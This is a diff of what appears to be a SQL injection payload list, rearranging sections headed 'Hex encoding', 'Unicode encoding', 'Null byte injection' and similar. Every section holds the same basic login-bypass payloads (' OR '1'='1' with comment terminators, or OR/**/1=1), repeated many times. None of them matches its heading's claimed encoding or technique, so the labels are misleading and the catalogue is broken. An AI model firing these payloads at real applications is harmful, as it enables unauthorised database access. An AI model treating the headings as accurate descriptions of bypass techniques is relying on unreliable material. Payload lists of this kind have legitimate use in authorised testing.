@@ -1,42 +1,19 @@
-# Case variation
-' OR '1'='1' --
-' OR '1'='1' --
-' OR '1'='1' --
-
-# Comment variation
-' OR '1'='1' --
-' OR '1'='1' /*
-' OR '1'='1' #
+# Encoding techniques
 ' OR '1'='1' --
 ' OR '1'='1' /*
 ' OR '1'='1' #
 
-# Space replacement
+# Character replacement
 ' OR/**/1=1
 ' OR/**/1=1
 ' OR/**/1=1
 
-# String concatenation
+# Comment-based bypass
 ' OR '1'='1' --
-' OR '1'='1' --
-' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1' #
 
-# Character encoding
-' OR '1'='1' --
-' OR '1'='1' --
-' OR '1'='1' --
-
-# Null byte injection
-' OR '1'='1' --
-' OR '1'='1' --
-' OR '1'='1' --
-
-# Unicode encoding
-' OR '1'='1' --
-' OR '1'='1' --
-' OR '1'='1' --
-
-# URL encoding
+# Space-based bypass
 ' OR '1'='1' --
 ' OR '1'='1' --
 ' OR '1'='1' --
@@ -47,6 +24,16 @@
 ' OR '1'='1' --
 
 # Hex encoding
+' OR '1'='1' --
+' OR '1'='1' --
+' OR '1'='1' --
+
+# Unicode encoding
+' OR '1'='1' --
+' OR '1'='1' --
+' OR '1'='1' --
+
+# Null byte injection
 ' OR '1'='1' --
 ' OR '1'='1' --
 ' OR '1'='1' --
